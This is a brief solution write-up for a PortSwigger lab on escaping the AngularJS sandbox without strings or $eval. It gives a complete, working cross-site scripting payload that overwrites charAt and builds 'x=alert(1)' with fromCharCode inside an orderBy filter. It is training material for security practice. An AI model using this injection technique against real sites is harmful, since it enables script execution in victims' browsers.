----

### Lab Description

This lab uses [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.


### Lab Solution


- At the search field insert the payload `&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
![](/static/img/Pasted_image_20230621083653.png)